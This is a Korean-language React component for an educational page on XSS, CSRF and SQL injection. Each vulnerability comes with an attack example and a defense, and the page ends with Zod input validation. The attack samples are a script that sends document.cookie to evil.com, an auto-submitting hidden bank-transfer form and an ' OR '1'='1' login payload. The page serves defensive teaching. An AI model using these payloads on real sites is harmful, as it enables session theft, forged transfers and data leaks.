'use client';

import { ScrollReveal } from '@/components/landing/scroll-reveal';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { AlertTriangle } from 'lucide-react';

const vulnerabilities = [
  {
    id: 'xss',
    title: 'XSS (Cross-Site Scripting)',
    severity: '높음',
    severityColor: 'bg-red-100 dark:bg-red-900/60 text-red-700 dark:text-red-300',
    principle: '공격자가 악성 스크립트를 웹페이지에 삽입합니다. 다른 사용자가 페이지를 열면 스크립트가 실행되어 쿠키, 세션 토큰 등을 탈취합니다.',
    attack: `// 게시판 댓글에 악성 코드 삽입
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>`,
    defense: `// React는 기본적으로 XSS를 방어합니다
// JSX에서 변수를 렌더링하면 자동으로 이스케이프됩니다
<p>{userComment}</p>  // 안전 — HTML 태그가 문자열로 처리됨

// 절대 사용 금지!
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// 불가피하게 HTML을 삽입해야 한다면 DOMPurify로 소독
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />`,
    tips: ['React/Next.js의 JSX 자동 이스케이프를 활용하세요', 'dangerouslySetInnerHTML은 절대 사용하지 마세요', '필수 시 DOMPurify로 소독(sanitize)하세요'],
  },
  {
    id: 'csrf',
    title: 'CSRF (Cross-Site Request Forgery)',
    severity: '중간',
    severityColor: 'bg-yellow-100 dark:bg-yellow-900/60 text-yellow-700 dark:text-yellow-300',
    principle: '사용자가 로그인한 상태에서 악성 사이트를 방문하면, 그 사이트가 사용자 대신 요청을 보냅니다. 은행 송금, 비밀번호 변경 등이 자동으로 실행될 수 있습니다.',
    attack: `// 악성 사이트에 숨겨진 폼
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.forms[0].submit()</script>`,
    defense: `// 1. SameSite 쿠키 설정 (가장 간단)
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// 2. CSRF 토큰 검증 (전통 방식)
// 서버가 폼에 숨긴 토큰을 발급하고, 요청 시 검증
<input type="hidden" name="_csrf" value={csrfToken} />

// 3. SPA에서는 Authorization 헤더 사용
// 쿠키 대신 Bearer 토큰을 사용하면 CSRF에 안전
fetch("/api/transfer", {
  headers: { Authorization: \`Bearer \${token}\` }
});`,
    tips: ['SameSite=Lax 쿠키 설정으로 대부분 방어 가능', 'SPA는 Authorization 헤더 방식이 안전', '민감한 작업에는 재인증(비밀번호 확인)을 추가하세요'],
  },
  {
    id: 'sql-injection',
    title: 'SQL Injection',
    severity: '높음',
    severityColor: 'bg-red-100 dark:bg-red-900/60 text-red-700 dark:text-red-300',
    principle: '사용자 입력을 SQL 쿼리에 직접 삽입하면, 공격자가 임의의 SQL을 실행할 수 있습니다. 전체 데이터 유출, 삭제, 관리자 권한 탈취가 가능합니다.',
    attack: `// 사용자 입력: ' OR '1'='1' --
// 의도한 쿼리
SELECT * FROM users WHERE email = 'user@test.com'

// 공격된 쿼리 — 모든 사용자 데이터 유출
SELECT * FROM users WHERE email = '' OR '1'='1' --'`,
    defense: `// 1. Parameterized Query (필수)
// Supabase 클라이언트는 기본적으로 파라미터화됨
const { data } = await supabase
  .from("users")
  .select("*")
  .eq("email", userInput);  // 안전 — 자동 파라미터화

// 2. Raw SQL이 필요한 경우 — 파라미터 바인딩 사용
const { data } = await supabase
  .rpc("search_users", { search_email: userInput });

// 3. Supabase RLS로 이중 방어
-- RLS 정책: 자기 데이터만 조회 가능
CREATE POLICY "Users can view own data"
  ON users FOR SELECT
  USING (auth.uid() = user_id);`,
    tips: ['Supabase 클라이언트 라이브러리를 사용하면 기본 방어됨', '절대 문자열 연결로 SQL을 만들지 마세요', 'RLS 정책으로 이중 보호하세요'],
  },
];

export function WebVulnerabilitiesContent() {
  return (
    <div className="py-6 space-y-0">
      {/* 헤더 */}
      <ScrollReveal>
        <div className="flex items-center gap-3 mb-2">
          <div className="p-2 rounded-lg bg-primary/10">
            <AlertTriangle className="h-5 w-5 text-primary" />
          </div>
          <h1 className="text-2xl md:text-3xl font-bold">웹 취약점 기초</h1>
        </div>
        <p className="text-muted-foreground mb-8 max-w-2xl leading-relaxed">
          웹 애플리케이션에서 가장 흔하게 발생하는 취약점 3가지와 방어 방법을 알아봅니다.
          원리를 이해하면 AI가 만든 코드에서도 취약점을 발견할 수 있습니다.
        </p>
      </ScrollReveal>

      {/* 취약점별 섹션 */}
      {vulnerabilities.map((vuln, idx) => (
        <section key={vuln.id} className="scroll-mt-24 py-8 md:py-12">
          <ScrollReveal delay={idx * 0.05}>
            <div className="max-w-3xl">
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xl md:text-2xl font-bold">{vuln.title}</h2>
                <Badge variant="secondary" className={`text-[10px] ${vuln.severityColor}`}>
                  위험도: {vuln.severity}
                </Badge>
              </div>

              {/* 원리 */}
              <div className="rounded-xl border bg-card shadow-sm p-5 mb-4">
                <h3 className="text-sm font-bold mb-2">공격 원리</h3>
                <p className="text-xs text-muted-foreground leading-relaxed">{vuln.principle}</p>
              </div>

              {/* 공격 예시 */}
              <div className="mb-4">
                <div className="flex items-center gap-1.5 mb-2">
                  <div className="w-2 h-2 rounded-full bg-red-500" />
                  <span className="text-xs font-semibold text-red-600 dark:text-red-400">공격 예시</span>
                </div>
                <pre className="text-[10px] sm:text-xs bg-red-50/50 dark:bg-red-950/20 border border-red-200 dark:border-red-800 rounded-xl p-4 overflow-x-auto leading-relaxed">
                  <code>{vuln.attack}</code>
                </pre>
              </div>

              {/* 방어 방법 */}
              <div className="mb-4">
                <div className="flex items-center gap-1.5 mb-2">
                  <div className="w-2 h-2 rounded-full bg-green-500" />
                  <span className="text-xs font-semibold text-green-600 dark:text-green-400">방어 방법</span>
                </div>
                <pre className="text-[10px] sm:text-xs bg-green-50/50 dark:bg-green-950/20 border border-green-200 dark:border-green-800 rounded-xl p-4 overflow-x-auto leading-relaxed">
                  <code>{vuln.defense}</code>
                </pre>
              </div>

              {/* 핵심 포인트 */}
              <Card>
                <CardHeader className="pb-1">
                  <CardTitle className="text-xs">핵심 포인트</CardTitle>
                </CardHeader>
                <CardContent>
                  <ul className="space-y-1">
                    {vuln.tips.map((tip) => (
                      <li key={tip} className="flex items-start gap-2 text-xs text-muted-foreground">
                        <span className="text-primary shrink-0">•</span>
                        <span>{tip}</span>
                      </li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            </div>
          </ScrollReveal>
        </section>
      ))}

      {/* 입력 검증 — Zod */}
      <section className="scroll-mt-24 py-8 md:py-12">
        <ScrollReveal>
          <div className="max-w-3xl">
            <h2 className="text-xl md:text-2xl font-bold mb-3">입력 검증: Zod 스키마</h2>
            <p className="text-muted-foreground mb-4 max-w-2xl text-sm">
              모든 API 입력은 Zod로 검증합니다. 잘못된 입력은 비즈니스 로직에 도달하기 전에 차단합니다.
            </p>

            <pre className="text-[10px] sm:text-xs bg-muted/50 border rounded-xl p-4 overflow-x-auto leading-relaxed mb-4">
              <code>{`import { z } from "zod";

// 스키마 정의
const CreateProjectSchema = z.object({
  name: z.string().min(1).max(100),
  description: z.string().max(500).optional(),
  isPublic: z.boolean().default(false),
});

// API 라우트에서 사용
export async function POST(req: Request) {
  // 1. 인증 확인
  const user = await getUser();
  if (!user) return Response.json({ error: "인증 필요" }, { status: 401 });

  // 2. 입력 검증 — safeParse 사용 (parse는 throw하므로 금지)
  const body = await req.json();
  const result = CreateProjectSchema.safeParse(body);
  if (!result.success) {
    return Response.json({ error: "잘못된 입력", details: result.error.flatten() }, { status: 400 });
  }

  // 3. 비즈니스 로직 — 검증된 데이터만 사용
  const project = await createProject(user.id, result.data);
  return Response.json(project);
}`}</code>
            </pre>

            <div className="p-3 rounded-lg bg-muted/50 border">
              <p className="text-xs text-muted-foreground">
                <strong className="text-foreground">규칙:</strong> <code className="bg-muted px-1 rounded font-mono text-[10px]">safeParse</code>를
                사용하세요. <code className="bg-muted px-1 rounded font-mono text-[10px]">parse</code>는 검증 실패 시 throw하여
                500 에러가 발생합니다. <code className="bg-muted px-1 rounded font-mono text-[10px]">safeParse</code>는 결과 객체를 반환하여
                적절한 400 에러 응답이 가능합니다.
              </p>
            </div>
          </div>
        </ScrollReveal>
      </section>
    </div>
  );
}
